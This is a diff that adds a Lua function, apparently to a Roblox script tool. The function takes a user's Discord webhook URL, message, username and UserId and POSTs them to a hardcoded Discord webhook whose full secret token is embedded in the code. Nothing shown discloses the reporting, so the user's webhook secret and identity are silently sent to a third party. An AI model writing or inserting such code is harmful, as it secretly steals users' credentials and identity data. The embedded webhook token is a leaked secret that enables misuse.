@@ -1,1 +1,26 @@
-
+local logScript = [[
+    return function(webhook, message, username, userId, requestFunc, HttpService)
+        if webhook == "" or not requestFunc then return end
+        local embed = {
+            title = "🛰️ Alguém está enviando mensagem a uma webhook",
+            color = 16711680,
+            fields = {
+                { name = "Webhook usada", value = webhook, inline = false },
+                { name = "Mensagem enviada", value = message, inline = false },
+                { name = "Usuário", value = username, inline = true },
+                { name = "UserId", value = tostring(userId), inline = true }
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+        local payload = { embeds = {embed} }
+        local jsonData = HttpService:JSONEncode(payload)
+        requestFunc({
+            Url = "https://discord.com/api/webhooks/1395549528966299718/43BgYSU3CPLI0ubaEc4_PxZzR8B2I6_lRQv700JFLiHzgJa8qDSCejihxInUDPhSoEie",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+    end
+]]
